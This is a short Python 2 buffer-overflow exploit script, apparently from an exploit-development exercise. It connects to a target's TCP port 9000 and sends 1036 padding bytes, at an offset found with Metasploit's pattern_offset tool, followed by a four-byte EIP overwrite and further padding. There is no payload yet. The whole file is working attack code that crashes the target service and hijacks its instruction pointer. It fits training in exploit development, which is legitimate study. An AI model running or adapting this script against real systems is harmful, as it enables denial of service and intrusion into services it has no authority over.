#!/usr/bin/python

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 9000))

# /usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 69423569
# [*] Exact match at offset 1036
buffer = "A" * 1036

buffer += "BBBB" # EIP Overwrite

buffer += "C" * 1500

sock.send(buffer)

print sock.recv(4000)

sock.close()
